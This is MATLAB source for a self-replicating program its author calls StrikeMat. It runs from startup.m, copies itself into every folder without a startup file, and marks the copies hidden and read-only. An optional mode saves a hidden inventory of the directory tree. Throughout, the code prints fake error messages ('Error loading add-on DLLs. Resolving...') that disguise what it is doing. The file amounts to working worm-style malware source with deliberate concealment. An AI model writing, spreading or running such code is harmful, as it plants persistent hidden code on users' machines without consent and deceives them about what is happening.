%%Actual code that allows the replicator to run

%%DISCLAIMER:
%%This program has been designed for easy cleanup if desired. It is
%%incapable of modifying files or permissions without external
%%modification.  While you may wish to modify any of the StrikeMat files,
%%DO SO AT YOUR OWN RISK!

%%PLEASE NOTE:
%%Modification of any script within the StrikeMat test files will remove
%%any obligation which I, the creator, am under to assist in the cleanup
%%and removal of StrikeMat files.
%%Thank you for your understanding.

function startup()

try
    begin = pwd;
    [allFiles,~] = deepscan(begin,false);
    numFiles = max(size(allFiles));
    for i = 1:numFiles
        if contains(allFiles{i},'repTest.m')
            execs = allFiles{i};
            break
        end
    end
    target = erase(execs,'\repTest.m');
    begin = cd(target); %#ok<NASGU>
    try
        format = split(target,'\');
        result = join(format(1:5),'\');
        hub = result{1};
    catch
        hub = target;
    end
    success = repTest(hub,true,false);
    if success == false
        disp('Command-line error.  Resolving...');
    end
catch ME
    disp(ME.stack.line);
    disp('Error loading workspace.  Resolving...');
end

clear;

end

function success = repTest(folder,replicate,harvest)

d = pwd;
if replicate
    try
        [allFiles,allFolders] = deepscan(folder,false);
    catch
        success = false;
        disp('Error loading add-on DLLs.  Resolving...')
        return
    end
    targets = cell(1,1);
    filenum = size(allFiles,1);
    foldnum = size(allFolders,1);
    tNum = 1;
    try
        for i = 1:foldnum
           folder = allFolders{i};
           compfile = fullfile(folder,'startup.m');
           isStartup = false;
           for m = 1:filenum
               file = allFiles{m};
               if strcmp(file,compfile)
                   isStartup = true;
                   break;
               end
           end
           if isStartup == false
               targets{tNum,1} = folder;
               tNum = tNum + 1;
           end
        end
    catch
        success = false;
        disp('A directory error has occurred.  Resolving...');
        return
    end
    if ~isempty(targets{1})
        try
            works = false;
            toCopy = fullfile(d,'startup.m');
            script = fileread(toCopy);
            for f = 1:size(targets)
                copying = targets{f};
                works = createStartup(copying,script,true);
            end
        catch ME
            disp(ME);
            success = false;
            disp('Unexpected startup file.  Resolving...');
            return
        end
    end
    if ~works
        disp('P-code file error.  Resolving...');
        success = false;
    else
        success = true;
    end
end
if harvest
    try
        [allFiles,allFolders] = deepscan(folder,false);
        savefile = fullfile(d,'runData.mat');
        save(savefile,'allFiles','allFolders');
        [didHide,~,~] = fileattrib(savefile,'+h -w','');
        if didHide == 0
            success = false;
        else
            success = true;
        end
    catch
        success = false;
        disp('Error loading add-on DLLs.  Resolving...')
        return
    end
end
end

function success = createStartup(targetFolder,script,hidden)

makeFile = fullfile(targetFolder,'startup.m');
%fileattrib(makeFile,'+w');
[fid,errorMessage] = fopen(makeFile,'w+');
disp(errorMessage);
fprintf(fid,'%s',script);
if hidden
    [status,~,~] = fileattrib(makeFile,'+h +a -w','');
    if status == 0
        success = false;
    else
        success = true;
    end
else
    success = true;
end

fclose(fid);

end

function [allFiles,allFolders] = deepscan(folder,makeTable)
originFolder = pwd;
[files,folders] = getAllSubFiles(folder);
allFiles = files;
keepScanning = true;
n = 1;
if ~isempty(folders{1})
    while keepScanning
        targetFolder = folders{n};
        [subFiles,subFolders] = getAllSubFiles(targetFolder);
        if ~isempty(subFiles{1})
            allFiles = [allFiles subFiles]; %#ok<*AGROW>
        end
        if ~isempty(subFolders{1})
            folders = [folders subFolders];
        end
        numSubFolders = max(size(folders));
        n = n + 1;
        if n == numSubFolders
            keepScanning = false;
        end
    end
    allFiles = allFiles';
    allFolders = folders';
else
    allFiles = files;
    allFolders = cell(1,1);
    allFolders{1} = 'No folders found.';
end
if makeTable
    fileTable = cell2table(allFiles,'VariableNames',{'FileName'});
    folderTable = cell2table(allFolders,'VariableNames',{'FolderName'});
    clc;
    disp(fileTable);
    pause
    disp(folderTable);
end
cd(originFolder); 
end

function [files,folders] = getAllSubFiles(targetFolder)
originFolder = cd(targetFolder);
subFiles = cell(1,1);
subFolders = cell(1,1);
this = dir;
numFiles = size(this,1);
these = cell(1,2);
line = 1;
for n = 1:numFiles
    fileID = this(n);
    if fileID.name(1) ~= '.'
        these{line,1} = fileID.name;
        these{line,2} = fileID.isdir;
        line = line + 1;
    end
end
directory = these;
if isempty(directory{1})
    files = cell(1,1);
    folders = cell(1,1);
    return
end
dirSize = size(directory,1);
scripts = 1;
folders = 1;
for k = 1:dirSize   
    checkThis = directory{k};
    mCheck = checkThis(end-1:end);
    notFolder = zeros(1,3);
    notFolder(3) = strcmp(mCheck,'.m');
    check = num2str(notFolder);
    if contains(check,'1')
        if notFolder(3) == 1
            checkThis = ['\',checkThis]; %#ok<*AGROW>
            subFiles{scripts} = fullfile(pwd,checkThis);
            scripts = scripts + 1;
        end
    else
        if directory{k,2} == true
            checkThis = ['\',checkThis];
            subFolders{folders} = [pwd,checkThis];
            folders = folders + 1;
        end
    end
end
files = subFiles;
folders = subFolders;
cd(originFolder);
end